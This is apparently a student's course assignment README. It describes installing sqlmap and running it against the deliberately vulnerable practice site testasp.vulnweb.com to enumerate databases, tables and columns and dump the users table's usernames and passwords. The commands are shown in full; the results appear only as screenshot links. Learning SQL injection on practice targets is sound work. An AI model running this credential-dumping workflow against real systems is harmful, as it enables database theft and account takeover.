# Abdullah Baig | 231485698 | Assignment 1

## Installation of `sqlmap`
- Installed ```sqlmap``` on Ubuntu Terminal using ```sudo apt install sqlmap```.


# SQL Injection Attack
- Go to [Vulnweb](https://vulnweb.com)
- Next step is to find a link that makes a request to the database, the link is `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 --dbs`
- To find tables `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 -D acuforum --tables`
- To find columns `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1-D acuforum -T users --columns`
- Dump username and password column with data in a file `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 -D acuforum -T users -C uname --dump` & `sqlmap -u testasp.vulnweb.com/showforum.asp?id=1 -D acuforum -T users -C upass --dump`

This is how the usernames and passwords of [Acuform](http://testasp.vulnweb.com/) were obtained including the admin credentials.

# Dump / Screenshots
## Command 1
<img width="1000" alt="ss" src="screenshots/1.png">
<img width="1000" alt="ss" src="screenshots/2.png">
<img width="1000" alt="ss" src="screenshots/3.png">

## Command 2
<img width="1000" alt="ss" src="screenshots/4.png">
<img width="1000" alt="ss" src="screenshots/5.png">

## Command 3
<img width="1000" alt="ss" src="screenshots/6.png">

## Command 4
<img width="1000" alt="ss" src="screenshots/7.png">

## Command 5
<img width="1000" alt="ss" src="screenshots/8.png">





